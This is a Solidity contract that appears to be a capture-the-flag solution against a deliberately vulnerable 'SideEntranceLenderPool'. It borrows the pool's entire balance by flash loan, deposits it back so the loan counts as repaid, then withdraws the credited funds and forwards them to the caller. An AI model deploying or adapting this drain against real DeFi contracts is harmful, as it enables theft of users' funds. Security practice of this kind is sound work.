//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

import "./SideEntranceLenderPool.sol";

contract SideSneakin {
    SideEntranceLenderPool public side;

    constructor(address addr) {
        side = SideEntranceLenderPool(addr);
    }

    function sneak() public {
        side.flashLoan(address(side).balance);
        side.withdraw();
    }

    function execute() public payable {
        side.deposit{value: msg.value}();
    }

    function withdraw() public {
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "failed to withdraw!");
    }

    receive() external payable {}
}
